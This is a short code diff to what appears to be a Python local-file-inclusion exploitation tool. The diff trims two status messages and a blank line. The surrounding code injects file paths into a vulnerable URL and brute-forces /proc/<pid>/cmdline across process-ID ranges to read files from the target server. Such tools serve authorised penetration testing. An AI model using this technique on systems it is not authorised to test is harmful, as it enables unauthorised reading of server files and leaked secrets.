@@ -57,7 +57,6 @@ def handle_lfi_request(target, decoder, noerr=False):
             decode_func = lfi_decoder_map.get(decoder, no_decoder)
         else:
             decode_func = no_decoder
-
         for filename, result in decode_func(resp, noerr):
             click.secho(f"{Fore.LIGHTYELLOW_EX}[LFI] {Fore.WHITE}Found: {Fore.LIGHTCYAN_EX}{filename}")
             click.secho(f"{Fore.WHITE}{result}")
@@ -94,14 +93,12 @@ def interrogate(injectable, filter_mode, suffix, repeat_prefix, decoder):
                     target_range = range(int(proc_bf_st), int(proc_bf_end) + 1)
                     for procid in target_range:
                         target = f"{injectable}{injection_prefix}/proc/{procid}/cmdline"
-                        click.secho(f"{Fore.LIGHTCYAN_EX}-------------------------{Fore.WHITE}/proc/{procid}/cmdline{Fore.LIGHTCYAN_EX}-------------------------")
                         handle_lfi_request(target, decoder, noerr=True)
                 except Exception as ex:
                     click.secho(f"{Fore.LIGHTRED_EX} [LPBF] Invalid path bruteforce range specified. try: 'lpbf:1,1000' for proc/1 to proc/1000")
             else:
                 # Prepare full url
                 target = f"{injectable}{injection_prefix}{filepath}{suffix}"
-                click.secho(f"{Fore.LIGHTYELLOW_EX}[LFI] {Fore.LIGHTCYAN_EX} Trying to fetch: {Fore.LIGHTYELLOW_EX}{target}{Style.RESET_ALL}")
                 handle_lfi_request(target, decoder)
 
     except KeyboardInterrupt:
